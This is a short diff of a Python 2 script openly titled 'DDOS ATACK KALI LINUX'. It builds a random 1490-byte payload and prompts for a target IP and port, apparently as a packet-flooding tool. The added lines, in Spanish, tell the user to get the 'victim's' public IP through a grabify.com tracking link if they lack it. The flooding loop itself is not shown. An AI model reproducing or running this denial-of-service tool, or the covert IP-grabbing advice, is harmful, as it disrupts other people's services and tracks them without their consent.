@@ -18,12 +18,13 @@ bytes = random._urandom(1490)
 #############
 
 os.system("clear")
-os.system("figlet DDOS ATACK KALI LINUX")
+os.system("figlet DDOS ATACK KALI LINUXv0.4")
 print "           " 
 print "Autor    : Evan01"
 print "You Tube : https://www.youtube.com/channel/UCkpaIqn_gz4xIT9PkASiRdg"
 print "github   : https://github.com/bythelink89/"
-print
+print "Si no tienes la direccion ip de la victima ve a https://grabify.com" 
+print "para generar un enlace que obtenga ip publica o mira el tutorial en la pagina de gihub" 
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
 
